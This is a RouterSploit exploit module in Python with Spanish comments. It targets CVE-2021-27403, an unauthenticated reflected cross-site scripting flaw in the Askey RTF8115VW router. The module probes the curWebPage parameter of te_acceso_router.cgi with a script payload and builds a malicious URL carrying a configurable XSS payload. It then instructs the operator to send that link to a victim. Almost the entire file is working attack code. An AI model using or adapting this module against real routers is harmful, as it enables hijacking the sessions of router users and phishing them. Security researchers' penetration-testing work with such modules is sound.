from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient
import urllib.parse

class Exploit(HTTPClient):
    __info__ = {
        "name": "Askey RTF8115VW XSS",
        "description": "Explota CVE-2021-27403 - Cross-Site Scripting no autenticado en Askey RTF8115VW",
        "authors": [
            "bokanrb",  # Descubrimiento original
            "Tu Nombre",  # Implementación para RouterSploit
        ],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2021-27403",
            "https://github.com/bokanrb/askey-rtf8115vw-vulnerabilities",
        ],
        "devices": [
            "Askey RTF8115VW (Movistar HGU)",
        ],
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")
    ssl = OptBool(False, "SSL enabled: true/false")
    payload = OptString('<img src=x onerror=alert("XSS")>', "XSS payload to inject")

    def run(self):
        if self.check():
            print_success("Target is vulnerable to CVE-2021-27403")
            
            # Generar URL maliciosa
            xss_url = self.generate_xss_url()
            print_success(f"URL maliciosa generada: {xss_url}")
            print_info("Envía esta URL a la víctima para ejecutar el payload")
            
        else:
            print_error("Target is not vulnerable")
    
    def check(self):
        print_status("Checking for CVE-2021-27403 vulnerability...")
        
        # Intentar inyección XSS simple
        test_payload = "<script>alert(1)</script>"
        encoded_payload = urllib.parse.quote(test_payload)
        
        # Construir URL para el ataque
        path = f"/cgi-bin/te_acceso_router.cgi?curWebPage={encoded_payload}"
        
        response = self.http_request(
            method="GET",
            path=path
        )
        
        if response and response.status_code == 200:
            # Verificar si el payload está reflejado sin filtrar
            if test_payload in response.text:
                print_success("XSS vulnerability detected - payload reflected unfiltered")
                return True
            elif "script" in response.text and "alert" in response.text:
                print_warning("Partial reflection detected - might be vulnerable")
                return True
        
        return False
    
    def generate_xss_url(self):
        # Codificar el payload para la URL
        encoded_payload = urllib.parse.quote(self.payload)
        
        # Construir URL completa
        scheme = "https" if self.ssl else "http"
        xss_url = f"{scheme}://{self.target}:{self.port}/cgi-bin/te_acceso_router.cgi?curWebPage={encoded_payload}"
        
        return xss_url
